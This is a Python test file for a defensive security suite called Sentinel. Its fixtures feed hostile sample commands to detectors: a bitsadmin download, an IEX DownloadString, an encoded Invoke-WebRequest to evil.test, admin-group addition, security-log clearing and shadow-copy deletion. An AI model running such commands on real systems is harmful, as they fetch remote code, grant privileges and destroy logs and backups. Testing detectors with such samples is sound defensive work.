from fastapi.testclient import TestClient

from main import app
from modules.build_manifest import CANONICAL_CAPABILITIES, CANONICAL_CAPABILITY_NAMES, CANONICAL_CAPABILITY_SLUGS
from modules.security_suite.router import RUNNERS


client = TestClient(app)


EXPECTED_NAMES = [
    "AV Scanner",
    "IOC Scanner",
    "Phishing Email Analyser",
    "Endpoint Investigation Collector",
    "Persistence Scanner",
    "Process Tree Viewer",
    "Suspicious Command Line Analyser",
    "Network Connection Monitor",
    "DNS Monitor",
    "DNS Protection Tool",
    "Windows Event Log Collector",
    "PowerShell Activity Analyser",
    "Timeline Builder",
    "Evidence Bundle Exporter",
    "Incident Report Generator",
    "Ransomware Behaviour Guard",
    "Backup Readiness Checker",
    "Windows Security Baseline Checker",
    "Patch Status Checker",
    "Installed Software Inventory",
    "CVE / KEV Vulnerability Matcher",
    "Browser Security Checker",
    "USB Guard",
    "Firewall Rule Auditor",
    "Local Account/Admin Audit",
    "Logon Event Analyser",
    "Privilege Change Monitor",
    "Mailbox Rule Checker",
    "Email Header Analyser",
    "Attachment Risk Analyser",
    "URL Redirect Tracer",
    "OAuth App Permission Checker",
    "Microsoft 365 Security Checker",
    "Threat Feed Aggregator",
    "YARA Rule Manager",
    "Sigma Rule Manager",
    "MITRE ATT&CK Mapper",
    "Case Management",
    "Mini-SIEM / Log Search",
    "Alert Correlation Engine",
    "Security Health Score",
    "Remediation Guidance Wizard",
    "Risk Register Export",
    "Secrets Scanner",
    "Git/Repo Security Scanner",
    "Container Image Scanner",
    "Cloud/SaaS Audit Importer",
    "Report Signing / Integrity Checker",
    "Role-Based Analyst/Home User Modes",
    "Signed Update and Rule Distribution System",
]


def test_canonical_capability_list_is_locked():
    assert len(CANONICAL_CAPABILITIES) == 50
    assert CANONICAL_CAPABILITY_NAMES == EXPECTED_NAMES
    assert len(set(CANONICAL_CAPABILITY_SLUGS)) == 50


def test_every_canonical_capability_has_suite_runner():
    assert set(CANONICAL_CAPABILITY_SLUGS) == set(RUNNERS)


def test_manifest_and_audit_routes_cover_all_capabilities():
    manifest = client.get("/api/security-suite/manifest")
    assert manifest.status_code == 200
    assert manifest.json()["count"] == 50

    audit = client.get("/api/security-suite/audit")
    assert audit.status_code == 200
    body = audit.json()
    assert body["coverage_count"] == 50
    assert all(item["covered"] for item in body["capabilities"])


def test_security_suite_runner_smoke_for_requested_tools():
    cases = {
        "suspicious_command_line_analyser": {"commands": ["powershell.exe -EncodedCommand SQBFAFgA"]},
        "ransomware_behaviour_guard": {"events": [{"action": "rename", "path": "C:\\data\\file.locked"}]},
        "mailbox_rule_checker": {"org_domains": ["example.com"], "rules": [{"name": "forward", "forward_to": "attacker@evil.test"}]},
        "email_header_analyser": {"raw_headers": "From: a@example.com\nReply-To: b@evil.test\nAuthentication-Results: mx; spf=fail\n\n"},
        "secrets_scanner": {"contents": ["OPENAI_API_KEY=sk-testtesttesttesttesttesttest"]},
        "container_image_scanner": {"dockerfile": "FROM python:latest\nRUN echo ok\n"},
        "report_signing_integrity_checker": {"document": {"case": "CASE-1"}},
    }

    for slug, payload in cases.items():
        response = client.post(f"/api/security-suite/run/{slug}", json=payload)
        assert response.status_code == 200, slug
        body = response.json()
        assert body["capability"] == slug
        assert body["status"] == "complete"
        assert "findings" in body


def test_findings_include_plain_english_context():
    response = client.post(
        "/api/security-suite/run/suspicious_command_line_analyser",
        json={"commands": ["powershell.exe -EncodedCommand SQBFAFgA"]},
    )
    assert response.status_code == 200
    finding = response.json()["findings"][0]
    assert finding["what_was_checked"].startswith("Sentinel inspected command lines")
    assert "trying to run PowerShell with its instructions encoded" in finding["possible_intent"]
    assert "Command line observed" in finding["evidence_summary"]
    assert finding["plain_english"]
    assert finding["analyst_next_step"] == finding["recommended_action"]


def test_suspicious_command_line_analyser_scores_common_windows_abuse():
    response = client.post(
        "/api/security-suite/run/suspicious_command_line_analyser",
        json={
            "commands": [
                "bitsadmin /transfer job http://evil.test/a.exe C:\\Users\\Public\\a.exe",
                "net localgroup administrators eviluser /add",
                "wevtutil cl Security",
            ]
        },
    )
    assert response.status_code == 200
    body = response.json()
    titles = {finding["title"] for finding in body["findings"]}
    assert "Bitsadmin transfer behaviour" in titles
    assert "Local administrator membership change" in titles
    assert "Security log clear command" in titles
    assert body["data"]["command_count"] == 3
    assert body["data"]["suspicious_count"] == 3
    assert body["data"]["highest_risk_score"] >= 35
    analysed = body["data"]["analysed"][0]
    assert analysed["urls"] == ["http://evil.test/a.exe"]
    assert analysed["risk_band"] in {"high", "critical"}


def test_process_tree_viewer_builds_lineage_and_flags_parent_child_chains():
    response = client.post(
        "/api/security-suite/run/process_tree_viewer",
        json={
            "processes": [
                {"pid": 100, "name": "winword.exe", "parent_pid": 50, "cmdline_text": "winword.exe invoice.docm"},
                {"pid": 101, "name": "powershell.exe", "parent_pid": 100, "cmdline_text": "powershell.exe -EncodedCommand SQBFAFgA"},
                {"pid": 102, "name": "lsass.exe", "parent_pid": 50, "path": "C:\\Users\\Public\\lsass.exe"},
            ]
        },
    )
    assert response.status_code == 200
    body = response.json()
    titles = {finding["title"] for finding in body["findings"]}
    assert "Suspicious parent-child process chain" in titles
    assert "Encoded PowerShell command" in titles
    assert "System-like process running from user-writable path" in titles
    assert body["data"]["process_count"] == 3
    assert body["data"]["suspicious_chain_count"] == 1
    powershell = next(item for item in body["data"]["tree"] if item["pid"] == 101)
    assert [item["name"] for item in powershell["lineage"]] == ["winword.exe", "powershell.exe"]
    finding = next(item for item in body["findings"] if item["title"] == "Suspicious parent-child process chain")
    assert "parent process launched a child process" in finding["possible_intent"]


def test_mitre_attack_mapper_maps_techniques_tactics_and_navigator_layer():
    response = client.post(
        "/api/security-suite/run/mitre_attack_mapper",
        json={
            "findings": [
                {
                    "finding_id": "F-PS-1",
                    "module": "Suspicious Command Line Analyser",
                    "title": "Encoded PowerShell command",
                    "severity": "critical",
                    "evidence": {"command": "powershell.exe -EncodedCommand SQBFAFgA"},
                },
                {
                    "finding_id": "F-RANSOM-1",
                    "module": "Ransomware Behaviour Guard",
                    "title": "Recovery tampering command observed",
                    "severity": "critical",
                    "evidence": {"command": "vssadmin delete shadows /all /quiet"},
                },
                {
                    "finding_id": "F-MAIL-1",
                    "module": "Mailbox Rule Checker",
                    "title": "Suspicious mailbox rule behaviour",
                    "severity": "high",
                    "evidence": {"forward_to": "attacker@evil.test"},
                },
            ]
        },
    )
    assert response.status_code == 200
    body = response.json()
    technique_ids = {row["technique_id"] for row in body["data"]["techniques"]}
    assert {"T1059.001", "T1027", "T1490", "T1114.003"}.issubset(technique_ids)
    assert "Execution" in body["data"]["covered_tactics"]
    assert "Impact" in body["data"]["covered_tactics"]
    assert body["data"]["navigator_layer"]["domain"] == "enterprise-attack"
    assert body["finding_count"] >= 4
    first = body["findings"][0]
    assert first["plain_english"]
    assert "MITRE ATT&CK framework" in first["possible_intent"]


def test_dns_monitor_compares_observed_records_to_baseline():
    response = client.post(
        "/api/security-suite/run/dns_monitor",
        json={
            "domains": ["example.com", "internal.example.com", "bad value"],
            "resolve_live": False,
            "record_types": ["A", "MX", "NS"],
            "expect_mx": True,
            "baseline": {
                "example.com": {"A": ["93.184.216.34"], "MX": ["mail.example.com"], "NS": ["ns1.example.com", "ns2.example.com"]},
                "internal.example.com": {"A": ["203.0.113.10"]},
            },
            "observed_records": {
                "example.com": {"A": ["203.0.113.20"], "MX": [], "NS": ["ns1.example.com"]},
                "internal.example.com": {"A": ["10.0.0.5"]},
            },
        },
    )
    assert response.status_code == 200
    body = response.json()
    titles = {finding["title"] for finding in body["findings"]}
    assert "DNS answer changed from baseline" in titles
    assert "Expected mail domain has no MX records" in titles
    assert "Domain has fewer than two name servers" in titles
    assert "DNS answer points to private or reserved IP" in titles
    assert "Invalid domain supplied" in titles
    assert body["data"]["records"]["example.com"]["records"]["A"] == ["203.0.113.20"]
    drift = next(item for item in body["findings"] if item["title"] == "DNS answer changed from baseline")
    assert "resolving differently from the expected baseline" in drift["possible_intent"]


def test_dns_protection_tool_generates_policy_artifacts_and_validation():
    response = client.post(
        "/api/security-suite/run/dns_protection_tool",
        json={
            "blocked_domains": ["evil.test", "*.bad.test", "microsoft.com", "not a domain"],
            "allowed_domains": ["evil.test"],
            "sinkhole_ip": "bad-ip",
        },
    )
    assert response.status_code == 200
    body = response.json()
    data = body["data"]
    titles = {finding["title"] for finding in body["findings"]}
    assert "DNS block conflicts with allowlist" in titles
    assert "Wildcard DNS block requested" in titles
    assert "High-value domain block requested" in titles
    assert "Invalid domain in DNS policy" in titles
    assert "Invalid sinkhole IP supplied" in titles
    assert data["dns_sinkhole"] == "0.0.0.0"
    assert "*.bad.test" in data["blocked_domains"]
    assert "0.0.0.0 microsoft.com" in data["hosts_file_entries"]
    assert data["rpz_zone_records"]
    assert data["dnsmasq_rules"]
    assert data["policy_sha256"]


def test_windows_event_log_collector_normalizes_and_summarizes_security_events():
    response = client.post(
        "/api/security-suite/run/windows_event_log_collector",
        json={
            "failure_threshold": 2,
            "events": [
                {"Id": 1102, "Channel": "Security", "TimeCreated": "2026-04-29T08:00:00Z", "TargetUserName": "admin", "Message": "The audit log was cleared."},
                {"Id": 4625, "Channel": "Security", "TimeCreated": "2026-04-29T08:01:00Z", "TargetUserName": "alice", "Message": "An account failed to log on."},
                {"Id": 4625, "Channel": "Security", "TimeCreated": "2026-04-29T08:02:00Z", "TargetUserName": "alice", "Message": "An account failed to log on."},
                {"Id": 7045, "Channel": "System", "ProviderName": "Service Control Manager", "Message": "A service was installed."},
                {"Id": 5007, "Channel": "Microsoft-Windows-Windows Defender/Operational", "Message": "Defender configuration changed."},
            ],
        },
    )
    assert response.status_code == 200
    body = response.json()
    titles = {finding["title"] for finding in body["findings"]}
    assert "Audit log cleared" in titles
    assert "Repeated failed logons" in titles
    assert "Service installed" in titles
    assert "Defender configuration changed" in titles
    assert body["data"]["event_count"] == 5
    assert body["data"]["event_counts_by_id"]["4625"] == 2
    assert body["data"]["timeline"][0]["event_id"] == "1102"


def test_powershell_activity_analyser_decodes_and_scores_script_activity():
    encoded = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABlAHMAdAAvAGEALgBwAHMAMQA="
    response = client.post(
        "/api/security-suite/run/powershell_activity_analyser",
        json={
            "processes": [{"name": "powershell.exe", "cmdline_text": f"powershell.exe -EncodedCommand {encoded}"}],
            "powershell_events": [
                {
                    "Id": 4104,
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')",
                    "User": "alice",
                }
            ],
        },
    )
    assert response.status_code == 200
    body = response.json()
    titles = {finding["title"] for finding in body["findings"]}
    assert "Encoded PowerShell command" in titles
    assert "PowerShell encoded command decoded" in titles
    assert "PowerShell script block contains suspicious behaviour" in titles
    assert body["data"]["decoded_commands"][0]["decoded"] == "Invoke-WebRequest http://evil.test/a.ps1"
    assert body["data"]["script_blocks"]
    assert body["data"]["event_counts_by_id"]["4104"] == 1


def test_timeline_builder_normalizes_phases_entities_and_clusters():
    response = client.post(
        "/api/security-suite/run/timeline_builder",
        json={
            "cluster_threshold": 2,
            "findings": [
                {"finding_id": "F-1", "module": "Phishing Email Analyser", "title": "Suspicious URL pattern", "severity": "high", "created_at": "2026-04-29T08:00:00Z", "domain": "evil.test"},
                {"finding_id": "F-2", "module": "PowerShell Activity Analyser", "title": "Encoded PowerShell command", "severity": "critical", "created_at": "2026-04-29T08:03:00Z", "user": "alice"},
                {"finding_id": "F-3", "module": "Windows Event Log Collector", "title": "Audit log cleared", "severity": "critical", "user": "alice"},
            ],
            "events": [
                {"event_id": "7045", "ProviderName": "Service Control Manager", "Message": "A service was installed", "TimeCreated": "2026-04-29T08:05:00Z", "Computer": "PC-1"},
            ],
        },
    )
    assert response.status_code == 200
    body = response.json()
    assert body["data"]["item_count"] == 4
    assert body["data"]["first_seen"] == "2026-04-29T08:00:00Z"
    assert body["data"]["phase_counts"]["Initial Access"] == 1
    assert body["data"]["phase_counts"]["Execution"] == 1
    assert body["data"]["phase_counts"]["Persistence"] == 1
    assert "alice" in body["data"]["entity_index"]
    titles = {finding["title"] for finding in body["findings"]}
    assert "Timeline item missing timestamp" in titles
    assert "High-risk activity cluster in timeline" in titles


def test_security_suite_workflow_packs_run():
    packs = client.get("/api/security-suite/packs")
    assert packs.status_code == 200
    body = packs.json()
    assert body["count"] >= 5

    response = client.post("/api/security-suite/run-pack/email_investigation", json={"use_samples": True})
    assert response.status_code == 200
    result = response.json()
    assert result["pack"] == "email_investigation"
    assert result["status"] == "complete"
    assert result["capability_count"] == 5
    assert result["finding_count"] > 0
    assert result["timeline"]
    assert result["remediation"]
    assert result["case_draft"]["title"] == "Email Investigation findings"
    assert 0 <= result["health_score"] <= 100


def test_external_check_blocks_private_targets_by_default():
    response = client.post("/api/security-suite/external-check", json={"target": "http://127.0.0.1:8000", "checks": ["http"]})
    assert response.status_code == 200
    body = response.json()
    assert body["capability"] == "external_service_checker"
    assert body["data"]["private_blocked"] is True
    assert body["finding_count"] == 1
